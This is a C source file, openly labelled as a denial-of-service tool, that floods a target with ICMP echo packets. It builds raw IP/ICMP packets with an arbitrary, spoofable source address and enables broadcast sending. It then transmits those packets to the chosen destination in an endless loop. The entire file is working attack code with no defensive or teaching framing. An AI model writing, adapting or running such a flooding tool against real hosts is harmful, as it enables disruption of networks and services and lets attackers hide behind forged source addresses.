/**
 * DoS : Denial Of Service Attack
 * ICMP Flooding
 *
 * Written By Voodoo 
 *
 * */

#include "packetsoup.h"


int main ( int argc, char *argv[ ] ) {

  unsigned long daddr;
  unsigned long saddr;
  int payload_size = 0, sent_size, on, i;
  int sent = 0;

  /*
  * Argument Parsing...*/

  if(argc < 3 || argc > 7) {
    Usage();
  }

  for( i = 1; i < argc; i ++ ) {
    
    if(strncmp(argv[i], "-s", 2) == 0) {
      saddr = inet_addr(argv[i+1]);
    }
    if(strncmp(argv[i], "-d", 2) == 0) {
      daddr = inet_addr(argv[i+1]);
    }
    if(strncmp(argv[i], "-p", 2) == 0) {
      payload_size = atoi(argv[i+1]);
    }
  } //end for loop
  //end arg parsing


  //Get Raw Socket
  int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  if(sockfd < 0) {
    perror("Could not create socket:");
    return 0;
  }

  puts("Socket Is Live!");

  //provide packet headers
  if( setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (const char *)&on, sizeof(on)) == -1 ) {
    perror("setsockopt:");
    return 0;
  }

  //allow socket to send datagrams to broadcast addresses
  if( setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, (const char *)&on, sizeof(on)) == -1 ) {
    perror("setsockopt");
    return 0;
  }


  //calc packet size
  int packet_size = sizeof(struct ip) + sizeof(struct icmp) + payload_size;
  char *packet = (char *)malloc(packet_size);

  if(!packet) {
    perror("Memory Error");
    close(sockfd);
    return 0;
  }

  //ip header
  struct ip *iphdr = (struct ip *)packet;
  struct icmp *icmphdr = (struct icmp *) (packet + sizeof(struct ip));

  //zero the packet buffer
  memset(packet, 0, packet_size);
  
  //set member variables and whatnot
  iphdr->ip_v = 4;
  iphdr->ip_hl = 5;
  iphdr->ip_tos = 0;
  iphdr->ip_len = htons(packet_size);
  iphdr->ip_id = rand();
  iphdr->ip_off = 0;
  iphdr->ip_ttl = 255;
  iphdr->ip_p = IPPROTO_ICMP;
  iphdr->ip_src.s_addr = saddr;
  iphdr->ip_dst.s_addr = daddr;
  //
  
  icmphdr->icmp_type = ICMP_ECHO;
  icmphdr->icmp_code = 0;
  icmphdr->icmp_seq = rand();
  icmphdr->icmp_id = rand();
  icmphdr->icmp_cksum = 0;
  
  struct sockaddr_in servaddr;
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = daddr;

  memset(&servaddr.sin_zero, 0, sizeof(servaddr.sin_zero));

  puts("Flooding Target...");

  while(1) {

    memset(packet + sizeof(struct ip) + sizeof(struct icmp), rand() % 255, payload_size);
    
    //calculate icmp header checksum
    icmphdr->icmp_cksum = 0;
    icmphdr->icmp_cksum = in_cksum( (unsigned short *)icmphdr, sizeof(struct icmp) + payload_size );

    if( ( sent_size = sendto( sockfd, packet, packet_size, 0, (struct sockaddr *) &servaddr, sizeof(servaddr) ) ) < 1 ) {
      perror("Packet Send Failed");
      break;
    }
    ++sent;
    printf("%d packets sent\r", sent);
    fflush(stdout);

    usleep(10000);

  }

  free(packet);
  packet = NULL;
  close(sockfd);

  return 0;
}
